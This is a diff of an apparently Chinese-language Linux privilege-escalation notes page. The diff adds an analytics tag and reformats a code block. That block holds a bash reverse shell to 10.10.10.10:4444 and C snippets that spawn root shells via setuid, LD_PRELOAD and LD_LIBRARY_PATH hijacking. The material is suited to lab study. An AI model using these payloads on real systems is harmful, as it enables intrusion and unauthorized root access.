@@ -47,6 +47,17 @@
     
       
 
+  
+
+
+  
+
+  
+
+
+  <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-H95YL3C9KG"),document.addEventListener("DOMContentLoaded",function(){"undefined"!=typeof location$&&location$.subscribe(function(t){gtag("config","G-H95YL3C9KG",{page_path:t.pathname})})})</script>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-H95YL3C9KG"></script>
+
 
     
     
@@ -1087,56 +1098,56 @@
                 
                 <p>更多详情看这里:
 <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups">https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups</a></p>
-<div class="highlight"><pre><span></span><code><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="o">&gt;</span><span class="err">＆</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.10.10.10</span><span class="o">/</span><span class="mi">4444</span><span class="w"> </span><span class="mi">0</span><span class="o">&gt;</span><span class="err">＆</span><span class="mi">1</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="o">&gt;</span><span class="err">＆</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.10.10.10</span><span class="o">/</span><span class="mi">4444</span><span class="w"> </span><span class="mi">0</span><span class="o">&gt;</span><span class="err">＆</span><span class="mi">1</span>
 
 
-<span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">shared</span><span class="w"> </span><span class="o">-</span><span class="n">fPIC</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="p">.</span><span class="n">config</span><span class="o">/</span><span class="n">libcalc</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">suid</span><span class="o">/</span><span class="n">libcalc</span><span class="p">.</span><span class="n">c</span><span class="w"></span>
+<span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">shared</span><span class="w"> </span><span class="o">-</span><span class="n">fPIC</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="p">.</span><span class="n">config</span><span class="o">/</span><span class="n">libcalc</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">suid</span><span class="o">/</span><span class="n">libcalc</span><span class="p">.</span><span class="n">c</span>
 
 <span class="c1">//service.c</span>
-<span class="kt">int</span><span class="w"> </span><span class="n">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
-<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="n">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span>
+<span class="p">}</span>
 
 <span class="c1">// libcalc.c</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
 
-<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="n">inject</span><span class="p">()</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span><span class="w"></span>
+<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="n">inject</span><span class="p">()</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">inject</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
-<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">inject</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span>
+<span class="p">}</span>
 
 <span class="c1">//user@debian:~/tools$ cat sudo//library_path.c</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
 
-<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">hijack</span><span class="p">()</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span><span class="w"></span>
+<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">hijack</span><span class="p">()</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">hijack</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="n">unsetenv</span><span class="p">(</span><span class="s">&quot;LD_LIBRARY_PATH&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">        </span><span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
-<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">hijack</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">unsetenv</span><span class="p">(</span><span class="s">&quot;LD_LIBRARY_PATH&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span>
+<span class="p">}</span>
 
 <span class="c1">//user@debian:~/tools$ cat sudo/preload.c</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">_init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="n">unsetenv</span><span class="p">(</span><span class="s">&quot;LD_PRELOAD&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">        </span><span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
-<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">_init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">unsetenv</span><span class="p">(</span><span class="s">&quot;LD_PRELOAD&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span>
+<span class="p">}</span>
 
 <span class="c1">//user@debian:~/tools$ cat suid/service.c</span>
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
-<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span>
+<span class="p">}</span>
 </code></pre></div>
                 
                   
